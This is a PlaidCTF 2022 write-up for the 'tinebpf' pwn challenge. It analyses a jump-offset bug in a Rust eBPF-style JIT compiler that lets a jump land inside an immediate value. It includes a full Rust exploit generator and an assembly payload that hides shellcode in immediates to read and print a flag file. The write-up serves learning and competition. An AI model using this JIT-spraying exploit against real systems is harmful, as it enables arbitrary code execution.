# PlaidCTF 2022: tinebpf

Participant: Robert Obkircher

## TL;DR / Short Summary

We are given the source code of a rust program that reads hex encoded eBPF like instructions, jit compiles them into x86_64 machine code and executes it.
The instructions themselves can't do anything interesting, but there is a bug in the calculation of the jump offsets which allows us to jump into an immediate value and execute arbitrary machine code.

## Task Description

> (pwn)
>
> Take a byte out of every pretty fun snack available here. We made these to help us improve our scrutiny of the messages flying around the Plaidiverse.
>
> tinebpf.chal.pwni.ng 1337

The title and task description already suggested that this task would be related to eBPF.
BPF stands for Berkeley Packet Filter and eBPF is an extended BPF JIT virtual machine in the Linux kernel.[^1][^2][^3]

The handout (`tinebpf.*.tgz`) contained the follwing files that are also included in this repository:

- Modified: `Cargo.lock`, `Cargo.toml`, `src/main.rs`
- Unmodified: `docker-compose.yml`, `Dockerfile`, `flag.txt`, `target/debug/tinebpf`, `xinetd.conf`

## Analysis Steps

Initial steps:

1. Install `rustup` and `IntelliJ Idea` with the Rust plugin and open the project.
2. Have a look at the files:
   - The `Dockerfile` maps `flag.txt` to `/flag.txt`
   - `docker-compose.yml` and `xinetd.conf` run the program on port 1337.
   - The only two crates in `Cargo.toml` are `hex` for hex decoding and `memmap2` for creating executable pages.
   - `main.rs` is the only rust file
3. Open `main.rs` and use the `Expand All to Level 2` action get an overview:
   - `MAXBPFINST = 128`: we can send at most this many instructions
   - Machine code related definitions:
       - `PROLOGUE`: clears all integer registers to zero
       - `EPILOGUE`: exit syscall
       - `enum X86RegT`
   - eBPF related definitions
       - `enum BpfRegT`
       - `struct BpfInstT`
       - `enum BpfClassT`: Immediate/Alu/Jump
       - `enum BpfModeT`: Only BpfImm is supported, no other memory access modes.
       - `enum BpfSrcT { BpfX, BpfK }`: Not sure what these mean.
       - `enum BpfAluOpT`, `enum BpfJmpOpT`: Both have ~12 members
   - impls and macros to produce machine code
   - `fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u8]>) -> Option<usize>` returns the machine code size
   - `fn verify_jmps(b_inst: &[BpfInstT]) -> Result<(), &str>`
   - `fn parse_raw_bytes(inp: &[u8]) -> Option<Vec<BpfInstT>>`: essentially a bitcast
   - `main`: 
     1. Read a line from stdin, trim it, hex decode it, check that the size is at most 128 instructions and parse the input into `Vec<BpfInstT>` and `verify_jumps`
     3. Initialize `addrs[i]` to `PROLOGUE.len() + 64 * i`: This represents the address of the ith instruction.
     4. Call `do_jit` 20 times with mutable `addrs` and set a boolean if the machine code size didn't change in two successive iterations.
     5. If the boolean was set: call `do_jit` again to produce a final output image, copy it into executable memory, flush stdout, and call it as a function.
4. Check if there are any obvious mistakes (e.g. in verify_jmps) by reading most of the code. Nothing found.
5. Create git repo[^5].
6. Move part of main into function `fn run(insts: &Vec<BpfInstT>)`.
7. Google about fuzzing and try `cargo-fuzz` and `afl`. See [Failed Attempts: Fuzzing](#fuzzing) below.
8. Write a Rust function to systematically generate all supported instructions (with constant `off` and `imm`), write the machine code to a file and call `ndisasm` to disassemble it.
   Notice that there are push/pop instructions generated. However, they don't allow us to manipulate the caller stack and that wouldn't help anyway because the epilogue calls system exit.  
   Example instruction: `BpfInstT { opc: 36, regs: 1, off: 0, imm: 0 }`
    ```
    00000000  4831C0            xor rax,rax
    ...
    0000002A  4D31FF            xor r15,r15

    0000002D  50                push rax
    0000002E  52                push rdx
    0000002F  4989FB            mov r11,rdi
    00000032  31C0              xor eax,eax
    00000034  41F7E3            mul r11d
    00000037  5A                pop rdx
    00000038  4889C7            mov rdi,rax
    0000003B  58                pop rax

    0000003C  B83C000000        mov eax,0x3c
    00000041  0F05              syscall
    ```
   
    Alu operations seem to be 3 bytes, immediates 10 and a jump to itself (offset - 1) is always 2 bytes. Jumps are either 2 or 5 bytes, depending on the size of the offset. The jump offset is added to `RIP`, which contains the address of the next instruction [^6].
   


At this point I gave up because I was too tired after staying up all night I and wanted to try something easier.
I went back to this challenge right before the end, but it was already too late and I didn't know how to continue.
A few days later I tried again:

9.  Look for overflow and indexing bugs. See [Failed Attempts: Overflow and indexing bugs](#overflow-and-indexing-bugs)
10. If we have forward and backward jumps could happen that the size of both jumps oscilates between 8 and 32 bit immediates which would result in an invalid jump at the end.
    At this point I wasted a lot of time with afl and cargo-fuzz again to try to find such a series of instructions.
    See [Failed Attempts: Fuzzing](#fuzzing) below.
11. Try to find growing/shrinking instructions by hand: By looking at the function `code()` and at machine code I tried to find a way to grow and shrink instructions. Shrinking was easy, but I couldn't come up with anything that grew.
12. Write code that prints a histogram of instruction sizes. The largest one was only 25 bytes, which is not enough to match the 64 bytes from `let mut olen = insts.len() * 64;`. This means we have to find instructions that change size.
13. Continue to look for instructions that expand: jumps with offset 0 are size zero, but there is no way to change the offset.

Breakthrough:

| jump direction | destination addr | source addr |
|----------------|------------------|-------------|
| forward        | old              | old         |
| backward       | new              | old         |

The offset computation of forward and backward jumps differs because `addrs` is updated in place.
Forward jumps always use both offsets from the previous iteration.
Backward jumps on the other hand observe the address of the destination that was computed in the current iteration.

Unconditional jumps are either 2 bytes (8 bit offset) or 5 bytes (32 bit offset).
When a backward jump is encoded in 2 bytes it can actually grow to 5 bytes, when the instructions before the target shrink enough. For example:

| i1  | i2  | ... | i3 jump to i2 | i4 |
|-----|-----|-----|---------------|----|

If i1 shrinks from 5 to 2 bytes then i2 moves by 3.
The offset for i3 is `addrs[i4] - addrs[i2]` because jump offsets are added to the address of the next instruction. Since `addrs[i4]` has not been updated yet this means that a 1 byte offset could turn into a 4 byte offset which would increase the size of i3 by 3 bytes.

I immediately tried to find instructions with oscilating sizes.
These were some of my notes:

| case  | f=forward jump | s=space | b=backward jump | i=instruction |
|-------|----------------|---------|-----------------|---------------|
| __1__ | f1=5           | s1      | b1=2            | i1            |
| __2__ | f2=2           | s2      | b2=5            | i2            |


| transition | jump   | constraint            | assuming s1=s2 |
|------------|--------|-----------------------|----------------|
| 1 -> 2     | b1->s2 | (3 + s1 + b1) > 128   | s >= 124       | 
| 1 -> 2     | f1->i1 | (s1 + b1) <= 127      | s <= 125       |
| 2 -> 1     | b2->s1 | (-3 + b2 + s2) <= 128 | s <= 126       |
| 2 -> 1     | f2->i2 | (s2 + b2) > 127       | s >= 123       |

It follows that `124 <= s <= 125`.

Initially I thought that we would start in case 2, but when I implemented this I realized that it would still require an expanding instruction to get there.

The final exploit was found with a bit of trial and error. It is described below.

## Vulnerabilities / Exploitable Issue(s)

Invalid addresses are used when generating code, which allows us to jump into an immediate and execute arbitrary code.

## Solution

We are going to create as specific pattern of tinebpf instructions that end up jumping into an immediate.
Each one is 8 bytes, but we use 2 of them to jump to the next immediate:

```rust
fn encode_immediate(machine_code: &[u8], jump_offset: u8) -> u64 {
    assert!(machine_code.len() <= 6);

    let mut value = [0x90; 8]; // NOPs
    value[0..machine_code.len()].copy_from_slice(machine_code);
    value[6] = 0xeb; // JMP
    value[7] = jump_offset;

    u64::from_le_bytes(value)
}
```

The `Dockerfile` tells us that the flag is in a file. The following assembly code can read it and write it to stdout using linux system calls [^7]:

```
BITS 64

; NOTE: instructions must be <= 6 bytes
;
; preconditions:
;   rax, rbx contain "flag.txt\0"

    mov     [rsp], rax
    mov     [rsp+8], rbx

    mov     rdi, rsp   ; const char *filename
    xor     rsi, rsi   ; int flags
    xor     rdx, rdx   ; int mode
    mov     rax, 2     ; sys_open
    syscall            ; returns file descriptor

    mov     rdi, rax   ; unsigned int fd
    mov     rsi, rsp   ; char *buf
    mov     rdx, 100   ; size_t count
    xor     rax, rax   ; sys_read
    syscall            ; returns number of bytes read

    mov     rdi, 1     ; unsigned int fd = stdout
    mov     rsi, rsp   ; const char *buf
    mov     rdx, rax   ; size_t count
    mov     rax, 1     ; sys_write
    syscall
```

Assemble it with `nasm` and parse the offset of each instruction from the output of `ndisasm`:

```rust
struct MachineCodeInstructions {
    code: Vec<u8>,
    offsets: Vec<usize>,
    sizes: Vec<usize>,
}

impl MachineCodeInstructions {
    fn nth(&self, index: usize) -> Option<&[u8]> {
        self.offsets.get(index).map(|&offset| {
            &self.code[offset..offset + self.sizes[index]]
        })
    }
}

fn assemble_payload(assembly: &Path, machine_code: &Path, disassembly: &Path) -> MachineCodeInstructions {
    let nasm = Command::new("nasm")
        .args(["-f", "bin", "-o"])
        .arg(machine_code)
        .arg(assembly)
        .status().unwrap();
    assert!(nasm.success());

    let ndisasm = Command::new("ndisasm")
        .args(["-b", "64"])
        .arg(machine_code)
        .stderr(Stdio::inherit())
        .output().unwrap();

    let out_string = String::from_utf8(ndisasm.stdout).unwrap();
    std::fs::write(disassembly, &out_string).unwrap();

    // NOTE: Contents look like this:
    // 00000000  48B8666C61672E74  mov rax,0x7478742e67616c66
    //          -7874
    // 0000000A  48890424          mov [rsp],rax
    let mut offsets = vec![];
    for line in out_string.lines() {
        if let Some(c) = line.chars().next() {
            if c.is_digit(16) {
                let offset = line.split_whitespace().next().unwrap();
                let offset = usize::from_str_radix(offset, 16).unwrap();
                offsets.push(offset);
            }
        }
    }

    let code = std::fs::read(machine_code).unwrap();

    let mut sizes = vec![];
    for i in 0..offsets.len() {
        let start = offsets[i];
        let end = offsets.get(i + 1).cloned().unwrap_or(code.len());
        sizes.push(end - start);
    }

    MachineCodeInstructions { code, offsets, sizes }
}
```

In the initial version of the exploit there was a limited number of immediates that could contain machine code, so I combined small instructions to a `max` size of 6 bytes:

```rust
impl MachineCodeInstructions {
    fn combine(&mut self, max: usize) {
        let mut offsets = vec![];
        let mut sizes = vec![];
        for (&offset, &size) in self.offsets.iter().zip(&self.sizes) {
            match sizes.last_mut() {
                Some(last) if *last + size <= max => *last += size,
                _ => {
                    offsets.push(offset);
                    sizes.push(size);
                },
            }
        }
        self.offsets = offsets;
        self.sizes = sizes;
    }
}
```

Loading an 8 byte immediate takes two `BpfInstT` instructions. This helper function appends them to a list:

```rust
fn add_immediate(instructions: &mut Vec<BpfInstT>, reg: BpfRegT, value: u64) {
    // make sure that this will be 8 bytes
    assert!(!is_uimm32!(value));
    instructions.push(BpfInstT { opc: 0x18, regs: reg as u8, off: 0, imm: value as u32 as i32 });
    instructions.push(BpfInstT { opc: 0, regs: 0, off: 0, imm: (value >> 32) as u32 as i32 });
}
```

The follwing function builds the string that we will have to send to the server.
First it parses and shrinks our assembly payload.
Then it emits two instructions to load `flag.txt\0` into `R0/rax` and `R6/rbx`
The payload is encoded into the immediates.
The jumps and padding are explained below.
Finaly the instructions are converted to binary with `to_raw_bytes`, encoded in hex and written to the file `exploit.hex`.
The final step is to `telnet` to the server and paste in the contents of that file.

```rust
fn exploit() {
    let mut payload = assemble_payload(Path::new("payload.asm"), Path::new("payload.machine_code"), Path::new("payload.disasm"));
    payload.combine(6);

    let two_bytes = BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 };
    let mut instructions = vec![];

    // store "flag.txt\0" into rax and rbx
    add_immediate(&mut instructions, BpfRegT::R0, u64::from_le_bytes(*b"flag.txt"));
    add_immediate(&mut instructions, BpfRegT::R6, u64::from_le_bytes(*b"\01234567"));

    instructions.push(BpfInstT { opc: 5, regs: 0, off: 4 + 1*2, imm: 0 });

    // off: 5 2 10 2 bytes
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 2 + 1 + 10*2 + 4, imm: 0 });
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 1 + 1 + 11*2 + 5, imm: 0 });
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 0 + 1 + 11*2 + 7, imm: 0 });

    // instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 });
    instructions.push(two_bytes.clone());

    // invalid jump goes here:
    //   eb02 jumps 2 bytes forward
    //   cc causes SIGTRAP for debugger
    // add_immediate(&mut instructions, 0x02ebcc_00_00000000);
    add_immediate(&mut instructions, BpfRegT::R0, 0x02eb90_00_00000000);

    // 100 bytes padding with payload
    for i in 0..10 {
        let jump_offset = if i < 9 { 2 } else { 14 * 2 + 2 };
        let immediate = encode_immediate(payload.nth(i).unwrap_or(&[]), jump_offset);
        add_immediate(&mut instructions, BpfRegT::R0, immediate);
    }

    // JUMP0
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 8 + 1 + 4 + 10*2, imm: 0 });

    for _ in 0..8 {
        instructions.push(two_bytes.clone());
    }

    // off: 2|5 2 10
    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - 8 - 1 - 10*2, imm: 0 });

    for _ in 0..4 {
        instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
    }

    // 100+ bytes padding with payload
    let n = 10 + payload.offsets.len().max(11);
    for i in 10..n {
        let jump_offset = if i < n { 2 } else { 0 };
        let immediate = encode_immediate(payload.nth(i).unwrap_or(&[]), jump_offset);
        add_immediate(&mut instructions, BpfRegT::R0, immediate);
    }

    let bytes = to_raw_bytes(&instructions);
    let mut encoded = hex::encode(bytes);
    encoded.push('\n');
    std::fs::write("exploit.hex", encoded).unwrap();

    run(&instructions);
}
```

The final call to `run` was only used during development. It contained the core logic of the original `main`, but with some debug output to show the machine code length of each instruction and the jump offset.

```
olen 4544
ilens: 10, 10, (5 384), (5 1728), (5 1856), (5 1920), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (5 2112), 2, 2, 2, 2, 2, 2, 2, 2, (5 -2572), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
nlen 368
ilens: 10, 10, (2 27), (5 129), (5 130), (5 129), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (5 129), 2, 2, 2, 2, 2, 2, 2, 2, (5 -129), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
nlen 365
ilens: 10, 10, (2 27), (5 129), (5 130), (5 129), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (5 129), 2, 2, 2, 2, 2, 2, 2, 2, (2 -126), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
nlen 362
ilens: 10, 10, (2 27), (5 129), (5 130), (5 129), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (2 126), 2, 2, 2, 2, 2, 2, 2, 2, (2 -123), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
nlen 359
ilens: 10, 10, (2 27), (2 126), (2 127), (2 126), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (2 126), 2, 2, 2, 2, 2, 2, 2, 2, (5 -129), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
nlen 353
ilens: 10, 10, (2 18), (2 120), (2 124), (2 126), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (5 129), 2, 2, 2, 2, 2, 2, 2, 2, (2 -123), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
nlen 353
flag=true, addrs changed
ilens: 10, 10, (2 18), (2 123), (2 127), (5 129), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (2 126), 2, 2, 2, 2, 2, 2, 2, 2, (2 -120), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
Running jitted code:
FLAG{TEST_FLAG}
```

| j6 | j3 j4 j5 | t1  | j2 | t3 t4 t5 | j1 | t2 |
|----|----------|-----|----|----------|----|----|

- All jumps are forward except j1.
- Because of the way addrs is initialized it takes 3 iterations until `j1` is 2 bytes small.
- This causes j2 to shrink as well.
- Then j3, j4, and j5 all shrink at the same time which causes j1 to expand.
- In the final iteration of the loop j2 grows again because it sees the larger j1. This is canceled out by j1 which shrinks again.
- Even though addrs changed the total code size stayed the same and we break out of the loop.
- In the last iteration j5 is emitted as a 5 byte jump. But j6 uses the old offset in the addrs array, which assumes that j5 is only 2 bytes. Thus j6 ends up 3 bytes too short. That is why the instruction before the target of 6j is an immediate.



## Failed Attempts

### Overflow and indexing bugs

While reading/skimming the code I thought about lots of logic bugs. Here are some of them:

Look at `emit_cond_jump` for possible overflows. The macros `is_imm8` and `is_simm32` seem to be correct, but when `joff` is computed there is a suspicious cast to `i16`, even though `verify_jumps` treats `idx` and `off` as `i32`:
```rust
    let joff = addrs[((cidx + 1) as i16 + off) as usize] as i64 - addrs[cidx + 1] as i64;
```

- `cidx + 1` is in range (0, 128]
- `off` is an `i16` that is part of the input
- `verify_jumps` ensures that their 32 bit sum is in (1, 128]. This means that there is probably no overflow.

Even if there were an overflow it would not be exploitable, because the `Dockerfile` copies a debug build, which means that overflow checks are probably enabled.

Look at the match statement in `do_jit`. There are 5 patterns that start with `BpfJmp`. The first 4 simply call `emit_cond_jump`.
At first glance last one seems interesting, because it sets `jmpoff` to -2 if `cinst.off == -1` and it emits a 2 byte `JMP rel8` instruction (relative to the EIP register, which contains the address of following instruction). However this simply avoids one extra iteration until the offset could be computed from `addrs`.
I also looked at the opcode bytes of `emit_cond_jump` and of the last one, but they seem reasonable.

Look at `veriy_jumps`: Think about jumping into immediates or other indexing bugs. Find nothing.

### Fuzzing

I tried fuzzing with random instructions to produce invalid jumps, but in hindsight it would have been better to use a more systematic approach first.

I followed the rust fuzzing book. [^4]
I couldn't get `cargo-fuzz` to work. 
`afl` worked but with no results.

```rust
use afl::fuzz;

fn main() {
    fuzz!(|data: tinebpf::main::FuzzInput| {
        tinebpf::main::fuzz(data.instructions);
    });
}
```

```rust
#[derive(Debug)]
pub struct FuzzInput {
    pub instructions: Vec<BpfInstT>
}

impl<'a> Arbitrary<'a> for FuzzInput {
    fn arbitrary(u: &mut Unstructured<'a>) -> arbitrary::Result<Self> {
        let len = u.arbitrary_len::<BpfInstT>()? % MAXBPFINST;
        let mut instructions = Vec::with_capacity(len.into());
        for i in 0..len {
            let index = (u16::arbitrary(u)? % (MAXBPFINST as u16 + 1)) as i16; // reduce the possibilities
            let off = index - (i as i16 + 1);
            let imm = i16::arbitrary(u)? as i32; // reduce the possibilities
            let regs = loop {
                let regs = u8::arbitrary(u)?;
                if (regs & 0xf0) > 0x90 || (regs & 0x0f) > 0x09 {
                    continue;
                }
                break regs;
            };
            loop {
                let opc = loop {
                    let opc = u8::arbitrary(u)?;
                    if is_supported(opc) {
                        break opc;
                    }
                };
                let inst = BpfInstT {
                    opc: opc as u8,
                    regs: regs as u8,
                    off,
                    imm,
                };
                if inst.code().is_some() {
                    instructions.push(inst);
                    break;
                }
            };
        }
        Ok(FuzzInput{instructions})
    }
}

pub fn fuzz(insts: Vec<BpfInstT>) {
    if verify_jmps(&insts).is_ok() {
        let mut olen = insts.len() * 64;
        let plen = PROLOGUELEN as u32;
        let mut addrs: Vec<u32> = (0..insts.len() + 1).map(|i| plen + 64 * i as u32).collect();
        let mut addrs2: Vec<u32> = addrs.clone();

        for _ in 0..20 {
            addrs2.copy_from_slice(&addrs);
            if let Some(nlen) = do_jit(&insts, &mut addrs, None) {
                if nlen == olen {
                    if addrs2 != addrs {
                        println!("same length but different!");
                        assert_eq!(addrs2, addrs, "same length but different!");
                    }
                    break;
                }
                olen = nlen;
            } else {
                break;
            }
        }
    }
}
```

## Alternative Solutions

I'm not aware of any alternative solutions.

## Lessons Learned

- Skipping sleep was a bad idea
- Maybe I shouldn't have given up without asking others
- Fuzzing is not an alternative to thinking.
- `afl` worked better than `cargo-fuzz` (e.g. the timeout of cargo fuzz didn't work).
- I learned about the `Arbitrary` trait to generate random datastructures.
- I learned what eBPF is

## References

[^1]: eBPF: https://ebpf.io/ 

[^2]: eBPF: https://en.wikipedia.org/wiki/Berkeley_Packet_Filter

[^3]: unofficial eBPF documentation: https://github.com/iovisor/bpf-docs/blob/master/eBPF.md

[^4]: Rust Fuzz Book, cargo-fuzz, AFL: https://rust-fuzz.github.io/book/introduction.html

[^5]: git repo: https://gitlab.defbra.xyz/ro/tinebpf

[^6]: x86_64 refernece manual: https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf

[^7]: http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

